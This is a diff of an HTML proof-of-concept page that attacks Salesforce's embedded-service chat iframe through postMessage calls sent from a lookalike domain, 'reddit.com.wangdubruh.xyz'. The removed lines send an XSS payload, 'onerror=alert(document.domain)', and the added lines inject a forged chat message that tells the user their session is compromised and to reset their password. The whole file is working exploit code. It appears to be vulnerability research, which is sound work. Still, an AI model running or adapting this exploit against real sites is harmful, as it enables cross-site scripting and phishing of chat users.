@@ -1,50 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <iframe
-      id="livechat"
-      src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
-      style="width: 100%; height: 600px;"
-    ></iframe>
+<body>
+  <h1>Salesforce PoC: Inject Chat Message</h1>
+  <iframe id="target" src="https://service.force.com/embeddedservice/4.0/esw.html?deploymentId=5725c000000XcUT" width="800" height="600"></iframe>
 
-    <script>
-      const iframe = document.getElementById("livechat");
+  <script>
+    const iframe = document.getElementById('target');
+    iframe.onload = () => {
+      console.log("[+] Iframe loaded (Salesforce 4.0)");
+      iframe.contentWindow.postMessage({
+        method: "script.load",
+        domain: "reddit.com.wangdubruh.xyz",
+        feature: "chasitor"
+      }, "*");
 
-      window.addEventListener("message", (e) => {
-        console.log("📩 Message from iframe:", e.data);
-      });
-
-      iframe.onload = () => {
-        console.log("[+] Iframe loaded (Salesforce 4.0)");
-
-        // Try loading a valid feature
-        const features = ["chasitor", "filetransfer"];
-
-        features.forEach((feature) => {
-          console.log("[📤] Sending script.load for feature:", feature);
-          iframe.contentWindow.postMessage(
-            {
-              method: "script.load",
-              domain: "reddit.com.wangdubruh.xyz",
-            },
-            "*"
-          );
-        });
-
-        // Try sending payload if chasitor accepts custom data
-        setTimeout(() => {
-          iframe.contentWindow.postMessage(
-            {
-              method: "chasitor.fakeMethod",
-              domain: "reddit.com.wangdubruh.xyz",
-              data: {
-                text: `<img src=x onerror=alert(document.domain)>`, // Payload
-              },
-            },
-            "*"
-          );
-        }, 2000);
-      };
-    </script>
-  </body>
+      setTimeout(() => {
+        iframe.contentWindow.postMessage({
+          method: "chasitor.sendMessage",
+          domain: "reddit.com.wangdubruh.xyz",
+          data: "[Attacker]: Your session is compromised. Please reset your password."
+        }, "*");
+      }, 1000);
+    };
+  </script>
+</body>
 </html>
